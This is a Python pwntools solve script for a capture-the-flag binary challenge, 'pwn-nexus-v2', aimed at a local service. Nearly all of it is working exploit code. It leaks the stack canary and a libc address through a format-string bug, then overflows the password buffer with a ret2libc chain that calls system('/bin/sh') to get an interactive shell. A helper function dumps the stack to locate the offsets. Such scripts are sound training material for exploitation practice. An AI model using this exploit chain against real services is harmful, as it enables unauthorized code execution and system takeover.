#!/usr/bin/env python3
"""
Solve script — pwn-nexus-v2 (fmtstr leak + bof, x86-64)
Run after patching binary with pwninit:
  pwninit --bin nexus --libc libc.so.6

NOTE: the format string offsets below are correct for Ubuntu 22.04 / glibc 2.35
compiled with -O0 -pie -fstack-protector-strong.
If offsets differ on your build, run find_offsets() first.
"""
from pwn import *

HOST = "localhost"
PORT = 9999

elf  = ELF("./nexus")
libc = ELF("./libc.so.6")

# Format string stack offsets (verify with find_offsets() first)
CANARY_OFFSET = 15   # adjust after running find_offsets()
LIBC_OFFSET   = 21   # __libc_start_call_main+something; adjust as needed

# Stack frame of authenticate(): [password 48B][canary 8B][saved_rbp 8B][rip 8B]
BOF_OFFSET = 48


def find_offsets(p):
    """Helper: dump stack to find canary and libc pointer positions."""
    payload = ".".join(f"%{i}$p" for i in range(1, 35))
    p.sendafter(b"Employee name: ", payload + "\n")
    p.recvuntil(b"Searching records for: ")
    leak_line = p.recvuntil(b"\n[-]").decode()
    values = leak_line.split(".")
    for i, v in enumerate(values, 1):
        v = v.strip()
        try:
            val = int(v, 16)
            tag = ""
            if val & 0xff == 0 and val >> 48 == 0:
                tag = " <-- CANARY CANDIDATE (ends 0x00)"
            elif 0x7f0000000000 <= val <= 0x7fffffffffff:
                tag = " <-- LIBC/STACK addr"
            log.info(f"[{i:02d}] {hex(val)}{tag}")
        except Exception:
            log.info(f"[{i:02d}] {v}")
    p.close()


def exploit():
    p = remote(HOST, PORT)

    # Stage 1: format string — leak canary + libc base
    fmt = f"%{CANARY_OFFSET}$p.%{LIBC_OFFSET}$p\n"
    p.sendafter(b"Employee name: ", fmt)
    p.recvuntil(b"Searching records for: ")
    raw = p.recvuntil(b"\n[-]").decode().split(".")

    canary    = int(raw[0].strip(), 16)
    libc_leak = int(raw[1].strip().split()[0], 16)

    # Adjust offset: __libc_start_call_main+x → subtract to get base
    libc.address = libc_leak - 0x29d90  # glibc 2.35 — verify with: readelf -s libc.so.6 | grep __libc_start_call_main
    log.success(f"Canary    : {hex(canary)}")
    log.success(f"libc leak : {hex(libc_leak)}")
    log.success(f"libc base : {hex(libc.address)}")

    # Stage 2: stack overflow — bypass canary + ret2libc (libc-only gadgets)
    pop_rdi = next(libc.search(asm("pop rdi; ret", arch="amd64")))
    ret_pad = next(libc.search(asm("ret",          arch="amd64")))
    binsh   = next(libc.search(b"/bin/sh\x00"))

    payload  = b"A" * BOF_OFFSET
    payload += p64(canary)
    payload += p64(0)                  # saved rbp (any value)
    payload += p64(ret_pad)            # stack alignment
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(libc.sym["system"])

    p.sendafter(b"Master password: ", payload)
    p.interactive()


def main():
    context.arch = "amd64"

    # Uncomment to identify the correct offsets first:
    # find_offsets(remote(HOST, PORT))

    exploit()


if __name__ == "__main__":
    main()
